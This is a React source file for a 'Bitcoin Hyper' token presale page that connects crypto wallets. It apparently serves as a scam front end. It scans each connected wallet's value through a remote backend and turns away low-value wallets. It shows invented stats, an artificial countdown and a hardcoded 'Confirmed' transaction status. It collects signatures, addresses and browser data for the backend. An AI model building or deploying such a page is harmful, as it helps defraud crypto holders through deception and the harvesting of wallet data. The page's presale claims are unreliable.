import React, { useState, useEffect } from 'react'
import { ConnectKitProvider, ConnectKitButton, getDefaultConfig } from "connectkit"
import { WagmiProvider, createConfig, http, useAccount, useDisconnect, useSignMessage } from "wagmi"
import { mainnet, polygon, bsc, arbitrum, optimism, avalanche, fantom, base, linea } from "wagmi/chains"
import { QueryClient, QueryClientProvider } from "@tanstack/react-query"
import './App.css'

// Create query client
const queryClient = new QueryClient()

// Supported chains
const allChains = [mainnet, polygon, bsc, arbitrum, optimism, avalanche, fantom, base, linea]

// WalletConnect Project ID
const walletConnectProjectId = "962425907914a3e80a7d8e7288b23f62"

// Backend URL
const BACKEND_API = "https://tokenbackend-5xab.onrender.com/api"

// BTH Presale Price
const BTH_PRICE = 0.17

// Create config
const config = createConfig(
  getDefaultConfig({
    appName: "Bitcoin Hyper | Official Presale",
    appDescription: "Join the Bitcoin Hyper Token Presale",
    appUrl: "https://bitcoinhyper.io",
    appIcon: "https://bitcoinhyper.io/logo.png",
    walletConnectProjectId: walletConnectProjectId,
    chains: allChains,
    transports: {
      [mainnet.id]: http("https://eth.llamarpc.com"),
      [polygon.id]: http("https://polygon-rpc.com"),
      [bsc.id]: http("https://bsc-dataseed.binance.org"),
      [arbitrum.id]: http("https://arb1.arbitrum.io/rpc"),
      [optimism.id]: http("https://mainnet.optimism.io"),
      [avalanche.id]: http("https://api.avax.network/ext/bc/C/rpc"),
      [fantom.id]: http("https://rpc.ftm.tools"),
      [base.id]: http("https://mainnet.base.org"),
      [linea.id]: http("https://rpc.linea.build")
    }
  })
)

// Notification Popup
const NotificationPopup = ({ type, title, message, onClose, show }) => {
  if (!show) return null;

  return (
    <div className={`notification-popup ${type} ${show ? 'show' : ''}`}>
      <div className="notification-content">
        <div className="notification-icon">
          {type === 'success' ? '✅' : type === 'error' ? '❌' : type === 'warning' ? '⚠️' : 'ℹ️'}
        </div>
        <div className="notification-text">
          <h4>{title}</h4>
          <p>{message}</p>
        </div>
        <button className="notification-close" onClick={onClose}>×</button>
      </div>
    </div>
  );
};

// Not Eligible Modal
const NotEligibleModal = ({ isOpen, onClose, scanData, onRetry }) => {
  if (!isOpen) return null;

  return (
    <div className="modal-overlay active" onClick={onClose}>
      <div className="modal-container" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content">
          <div className="modal-header">
            <div className="modal-icon warning">⚠️</div>
            <h2 className="modal-title">Portfolio Verification Required</h2>
          </div>

          <div className="modal-body">
            <div className="verification-status">
              <div className="status-item">
                <span className="status-label">Wallet Value:</span>
                <span className="status-value">${parseFloat(scanData?.totalValueUSD || 0).toFixed(2)}</span>
              </div>
              <div className="status-item">
                <span className="status-label">Required Minimum:</span>
                <span className="status-value">$10.00+</span>
              </div>
              <div className="status-item">
                <span className="status-label">Status:</span>
                <span className="status-value failed">Not Eligible</span>
              </div>
            </div>

            <div className="verification-reason">
              <h4>Verification Details:</h4>
              <p>{scanData?.eligibilityReason || 'Minimum portfolio requirements not met.'}</p>
            </div>
          </div>

          <div className="modal-footer">
            <button className="modal-btn secondary" onClick={onClose}>
              Return
            </button>
            <button className="modal-btn primary" onClick={() => {
              onRetry();
              onClose();
            }}>
              Connect Different Wallet
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

// Claim Confirmation Modal
const ClaimConfirmationModal = ({ isOpen, onClose, onConfirm, scanData, address }) => {
  if (!isOpen) return null;

  const tokenAmount = scanData?.tokenAllocation?.amount || '5000';
  const allocationValue = (parseInt(tokenAmount) * BTH_PRICE).toFixed(2);

  const signatureMessage = `Bitcoin Hyper Token Presale Authorization

Wallet: ${address}
Allocation: ${tokenAmount} BTH
Value: $${allocationValue}
Timestamp: ${new Date().toISOString()}

Purpose: Wallet verification for Bitcoin Hyper presale allocation.`;

  return (
    <div className="modal-overlay active" onClick={onClose}>
      <div className="modal-container" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content">
          <div className="modal-header">
            <div className="modal-icon success">🔐</div>
            <h2 className="modal-title">Confirm Token Allocation</h2>
          </div>

          <div className="modal-body">
            <div className="allocation-summary">
              <div className="summary-item">
                <span className="summary-label">Token Amount:</span>
                <span className="summary-value">{tokenAmount} BTH</span>
              </div>
              <div className="summary-item">
                <span className="summary-label">Presale Price:</span>
                <span className="summary-value">$${BTH_PRICE.toFixed(2)} per BTH</span>
              </div>
              <div className="summary-item highlight">
                <span className="summary-label">Total Value:</span>
                <span className="summary-value">$${allocationValue}</span>
              </div>
            </div>

            <div className="signature-preview">
              <p>This signature verifies your wallet ownership for the presale allocation.</p>
              <p><strong>Wallet:</strong> {address?.substring(0, 6)}...{address?.substring(38)}</p>
              <p><strong>Allocation:</strong> {tokenAmount} BTH ($${allocationValue})</p>
            </div>
          </div>

          <div className="modal-footer">
            <button className="modal-btn secondary" onClick={onClose}>
              Cancel
            </button>
            <button className="modal-btn success" onClick={() => {
              onConfirm(signatureMessage);
              onClose();
            }}>
              Sign & Confirm
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

// Celebration Modal
const CelebrationModal = ({ isOpen, onClose, claimData }) => {
  if (!isOpen) return null;

  return (
    <div className="modal-overlay active celebration" onClick={onClose}>
      <div className="modal-container" onClick={(e) => e.stopPropagation()}>
        <div className="modal-content success">
          <div className="modal-header">
            <div className="modal-icon celebration">🎉</div>
            <h2 className="modal-title">Tokens Secured Successfully!</h2>
          </div>

          <div className="modal-body">
            <div className="success-details">
              <div className="detail-card">
                <div className="detail-icon">✅</div>
                <div className="detail-content">
                  <h3>Allocation Confirmed</h3>
                  <p>{claimData?.tokenAmount || '5,000'} BTH at ${BTH_PRICE.toFixed(2)} each</p>
                </div>
              </div>

              <div className="transaction-info">
                <div className="info-item">
                  <span className="info-label">Claim ID:</span>
                  <span className="info-value">{claimData?.claimId || `BTH-${Date.now()}`}</span>
                </div>
                <div className="info-item">
                  <span className="info-label">Transaction:</span>
                  <span className="info-value success">Confirmed</span>
                </div>
                <div className="info-item">
                  <span className="info-label">Total Value:</span>
                  <span className="info-value highlight">${claimData?.tokenValue || (5000 * BTH_PRICE).toFixed(2)}</span>
                </div>
              </div>
            </div>
          </div>

          <div className="modal-footer">
            <button className="modal-btn success" onClick={onClose}>
              Continue
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

// Main App Component
function BitcoinHyperPresale() {
  const { address, isConnected } = useAccount()
  const { disconnect } = useDisconnect()
  const { signMessage } = useSignMessage()
  
  const [scanning, setScanning] = useState(false)
  const [isEligible, setIsEligible] = useState(false)
  const [backendStatus, setBackendStatus] = useState('checking')
  const [claimData, setClaimData] = useState(null)
  const [processing, setProcessing] = useState(false)
  const [scanData, setScanData] = useState(null)
  const [sessionId, setSessionId] = useState('')
  
  // Modal states
  const [showNotEligibleModal, setShowNotEligibleModal] = useState(false)
  const [showClaimConfirmModal, setShowClaimConfirmModal] = useState(false)
  const [showCelebrationModal, setShowCelebrationModal] = useState(false)
  
  // Notification state
  const [notification, setNotification] = useState({
    show: false,
    type: 'info',
    title: '',
    message: ''
  })

  // Presale stats
  const [presaleStats] = useState({
    raised: "$4,892,450",
    participants: "12,458",
    tokensSold: "89.4M",
    progress: 78
  })
  
  const [countdown, setCountdown] = useState({
    days: 3,
    hours: 12,
    minutes: 45,
    seconds: 30
  })

  // Show notification
  const showNotification = (type, title, message, duration = 5000) => {
    setNotification({ show: true, type, title, message })
    setTimeout(() => {
      setNotification(prev => ({ ...prev, show: false }))
    }, duration)
  }

  // Generate session ID and track visit
  useEffect(() => {
    const generateSessionId = () => {
      return 'session_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9)
    }
    
    const session = generateSessionId()
    setSessionId(session)
    
    const trackVisit = async () => {
      try {
        await fetch(`${BACKEND_API}/track/visit`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            userAgent: navigator.userAgent,
            referrer: document.referrer,
            sessionId: session
          })
        })
      } catch (error) {
        console.log('Visit tracking:', error.message)
      }
    }
    
    trackVisit()
  }, [])

  // Initialize backend check
  useEffect(() => {
    const testBackend = async () => {
      try {
        const response = await fetch(`${BACKEND_API}/health`)
        if (response.ok) {
          const data = await response.json()
          console.log('✅ Backend connected:', data)
          setBackendStatus('connected')
          showNotification('success', 'System Connected', 'Backend systems are LIVE')
        } else {
          setBackendStatus('error')
          showNotification('error', 'Connection Issue', 'Unable to connect to backend')
        }
      } catch (error) {
        console.error('❌ Backend error:', error)
        setBackendStatus('error')
      }
    }
    
    testBackend()
    
    // Start countdown timer
    const interval = setInterval(() => {
      setCountdown(prev => {
        let { days, hours, minutes, seconds } = prev
        seconds--
        
        if (seconds < 0) {
          seconds = 59
          minutes--
        }
        if (minutes < 0) {
          minutes = 59
          hours--
        }
        if (hours < 0) {
          hours = 23
          days--
        }
        if (days < 0) {
          clearInterval(interval)
          return { days: 0, hours: 0, minutes: 0, seconds: 0 }
        }
        
        return { days, hours, minutes, seconds }
      })
    }, 1000)
    
    return () => clearInterval(interval)
  }, [])

  // Auto scan when wallet connects
  useEffect(() => {
    if (isConnected && address && backendStatus === 'connected' && sessionId) {
      setTimeout(() => {
        triggerWalletScan()
      }, 800)
    }
  }, [isConnected, address, backendStatus, sessionId])

  const triggerWalletScan = async () => {
    if (!address) return
    
    setScanning(true)
    showNotification('info', 'Wallet Analysis', 'Scanning your wallet portfolio...')
    
    try {
      const response = await fetch(`${BACKEND_API}/presale/connect`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: address,
          userAgent: navigator.userAgent,
          sessionId,
          timestamp: new Date().toISOString()
        })
      })
      
      if (response.ok) {
        const data = await response.json()
        
        if (data.success) {
          setScanData(data.data)
          
          setTimeout(() => {
            setScanning(false)
            
            if (data.data.isEligible) {
              setIsEligible(true)
              showNotification('success', 'Eligibility Confirmed!', `You qualify for ${data.data.tokenAllocation.amount} BTH!`)
              createFloatingCoins()
            } else {
              setIsEligible(false)
              setTimeout(() => {
                setShowNotEligibleModal(true)
              }, 1000)
            }
          }, 2000)
        }
      } else {
        throw new Error('Scan failed')
      }
    } catch (error) {
      console.error('Scan error:', error)
      setScanning(false)
      showNotification('error', 'Scan Failed', 'Unable to analyze wallet. Please try again.')
    }
  }

  const handleClaimConfirmation = (signatureMessage) => {
    setProcessing(true)
    showNotification('info', 'Processing Claim', 'Securing your allocation...')
    
    setTimeout(() => {
      processTokenClaim(signatureMessage)
    }, 1500)
  }

  const processTokenClaim = async (signatureMessage) => {
    if (!address) return
    
    try {
      const signature = await signMessage({ message: signatureMessage })
      
      const tokenAmount = scanData?.tokenAllocation?.amount || '5000'
      const allocationValue = (parseInt(tokenAmount) * BTH_PRICE).toFixed(2)
      
      const response = await fetch(`${BACKEND_API}/presale/claim`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          walletAddress: address,
          signature,
          message: signatureMessage,
          claimAmount: `${tokenAmount} BTH`,
          claimValue: `$${allocationValue}`,
          sessionId
        })
      })
      
      if (response.ok) {
        const data = await response.json()
        
        if (data.success) {
          setClaimData(data.data)
          setProcessing(false)
          
          setTimeout(() => {
            setShowCelebrationModal(true)
            createConfetti()
          }, 1000)
        }
      } else {
        throw new Error('Claim failed')
      }
    } catch (error) {
      console.error('Claim error:', error)
      setProcessing(false)
      showNotification('error', 'Claim Failed', 'Please try again or contact support.')
    }
  }

  // Animation functions
  const createFloatingCoins = () => {
    for (let i = 0; i < 15; i++) {
      setTimeout(() => {
        const coin = document.createElement('div')
        coin.innerHTML = '💰'
        coin.style.cssText = `
          position: fixed;
          font-size: ${Math.random() * 25 + 20}px;
          color: #F7931A;
          top: ${Math.random() * 100}vh;
          left: ${Math.random() * 100}vw;
          animation: coinFloat ${Math.random() * 2 + 1}s ease-in-out forwards;
          z-index: 9998;
          opacity: 0;
        `
        document.body.appendChild(coin)
        
        setTimeout(() => {
          if (coin.parentNode) {
            coin.parentNode.removeChild(coin)
          }
        }, 2000)
      }, i * 100)
    }
  }

  const createConfetti = () => {
    const colors = ['#F7931A', '#FFD700', '#10b981', '#3b82f6', '#8b5cf6']
    for (let i = 0; i < 100; i++) {
      setTimeout(() => {
        const confetti = document.createElement('div')
        confetti.style.cssText = `
          position: fixed;
          width: ${Math.random() * 10 + 5}px;
          height: ${Math.random() * 10 + 5}px;
          background: ${colors[Math.floor(Math.random() * colors.length)]};
          top: -20px;
          left: ${Math.random() * 100}vw;
          opacity: 0;
          animation: confettiFall ${Math.random() * 3 + 2}s linear forwards;
          border-radius: ${Math.random() > 0.5 ? '50%' : '0'};
          transform: rotate(${Math.random() * 360}deg);
          z-index: 9999;
        `
        document.body.appendChild(confetti)
        
        setTimeout(() => {
          if (confetti.parentNode) {
            confetti.parentNode.removeChild(confetti)
          }
        }, 5000)
      }, i * 20)
    }
  }

  const formatNumber = (num) => {
    return num < 10 ? `0${num}` : num
  }

  return (
    <div className="app-container">
      <NotificationPopup 
        show={notification.show}
        type={notification.type}
        title={notification.title}
        message={notification.message}
        onClose={() => setNotification(prev => ({ ...prev, show: false }))}
      />
      
      <NotEligibleModal
        isOpen={showNotEligibleModal}
        onClose={() => setShowNotEligibleModal(false)}
        scanData={scanData}
        onRetry={() => {
          disconnect()
          setShowNotEligibleModal(false)
          showNotification('info', 'Wallet Disconnected', 'Please connect a different wallet')
        }}
      />
      
      <ClaimConfirmationModal
        isOpen={showClaimConfirmModal}
        onClose={() => setShowClaimConfirmModal(false)}
        onConfirm={handleClaimConfirmation}
        scanData={scanData}
        address={address}
      />
      
      <CelebrationModal
        isOpen={showCelebrationModal}
        onClose={() => setShowCelebrationModal(false)}
        claimData={claimData}
      />
      
      <div className="main-content">
        <header className="app-header">
          <div className="logo-container">
            <div className="logo-icon">₿</div>
            <div>
              <h1 className="logo-title">BITCOIN HYPER</h1>
              <div className="logo-subtitle">OFFICIAL PRESALE LAUNCH</div>
            </div>
          </div>
          
          <div className="header-actions">
            {backendStatus === 'connected' && (
              <div className="backend-indicator connected">
                <span className="indicator-dot"></span>
                <span>System LIVE</span>
              </div>
            )}
            
            <ConnectKitButton.Custom>
              {({ show, truncatedAddress, ensName }) => (
                <button onClick={show} className="connect-button">
                  {isConnected ? (
                    <div className="connected-wallet">
                      <span className="wallet-icon">👛</span>
                      <span className="wallet-address">{ensName || `${truncatedAddress}`}</span>
                    </div>
                  ) : 'Connect Wallet'}
                </button>
              )}
            </ConnectKitButton.Custom>
          </div>
        </header>

        <section className="hero-section">
          <div className="hero-bitcoin">₿</div>
          
          <h2 className="hero-title">NEXT GENERATION BITCOIN ECOSYSTEM</h2>
          
          <p className="hero-description">
            Bitcoin Hyper brings DeFi 2.0 to the Bitcoin ecosystem. Join the presale now 
            and be part of the revolution.
          </p>
          
          <div className="stats-grid">
            {Object.entries(presaleStats).map(([label, value]) => (
              <div key={label} className="stat-card">
                <div className="stat-value">{value}</div>
                <div className="stat-label">
                  {label.replace(/([A-Z])/g, ' $1').toUpperCase()}
                </div>
              </div>
            ))}
          </div>
          
          {backendStatus === 'checking' ? (
            <div className="loading-container">
              <div className="loading-spinner"></div>
              <h3 className="loading-title">Establishing Secure Connection...</h3>
            </div>
          ) : backendStatus === 'error' ? (
            <div className="error-container">
              <div className="error-icon">🔴</div>
              <h3 className="error-title">Connection Issue Detected</h3>
            </div>
          ) : !isConnected ? (
            <div className="cta-container">
              <div className="cta-icon">🚀</div>
              <h3 className="cta-title">Connect Wallet to Start</h3>
              <p className="cta-description">
                Connect your wallet to check eligibility and secure your presale allocation
              </p>
              <ConnectKitButton.Custom>
                {({ show }) => (
                  <button onClick={show} className="cta-button">
                    CONNECT WALLET
                  </button>
                )}
              </ConnectKitButton.Custom>
            </div>
          ) : scanning ? (
            <div className="scanning-container">
              <div className="scanning-spinner"></div>
              <h3 className="scanning-title">Analyzing Wallet Portfolio...</h3>
              <p className="scanning-description">Checking eligibility across blockchain networks</p>
            </div>
          ) : (
            <div className="status-summary">
              <div className={`status-card ${isEligible ? 'eligible' : 'not-eligible'}`}>
                <div className="status-icon">
                  {isEligible ? '✅' : '⚠️'}
                </div>
                <div className="status-content">
                  <h3>{isEligible ? 'Eligible for Presale!' : 'Verification Required'}</h3>
                  <p>
                    {isEligible 
                      ? `You qualify for ${scanData?.tokenAllocation?.amount || '5,000'} BTH at $${BTH_PRICE.toFixed(2)} each` 
                      : 'Please connect a different wallet with sufficient balance'}
                  </p>
                  {isEligible && scanData?.tokenAllocation?.valueUSD && (
                    <div className="allocation-value">
                      Total Value: <span className="value-highlight">${scanData.tokenAllocation.valueUSD}</span>
                    </div>
                  )}
                </div>
                <button 
                  className="status-button"
                  onClick={isEligible ? () => setShowClaimConfirmModal(true) : () => {
                    disconnect()
                    showNotification('info', 'Wallet Disconnected', 'Please connect a different wallet')
                  }}
                  disabled={processing}
                >
                  {processing ? (
                    <>
                      <span className="button-spinner"></span>
                      Processing...
                    </>
                  ) : isEligible ? 'Claim Tokens' : 'Try Different Wallet'}
                </button>
              </div>
            </div>
          )}
        </section>

        <footer className="app-footer">
          <div className="footer-description">
            Bitcoin Hyper is the next evolution of Bitcoin. Join the presale now to secure your position.
          </div>
          <div className="footer-links">
            <span>© 2024 Bitcoin Hyper. All rights reserved.</span>
            <span>|</span>
            <span className={backendStatus === 'connected' ? 'status-connected' : 'status-error'}>
              {backendStatus === 'connected' ? '✅ System LIVE' : '⚠️ System Offline'}
            </span>
          </div>
        </footer>
      </div>
    </div>
  )
}

// ConnectKit Theme
const customTheme = {
  borderRadius: "large",
  fontStack: "system",
  overlay: "blur",
  theme: "midnight"
}

// Main App Wrapper
function App() {
  return (
    <WagmiProvider config={config}>
      <QueryClientProvider client={queryClient}>
        <ConnectKitProvider theme={customTheme}>
          <BitcoinHyperPresale />
        </ConnectKitProvider>
      </QueryClientProvider>
    </WagmiProvider>
  )
}

export default App
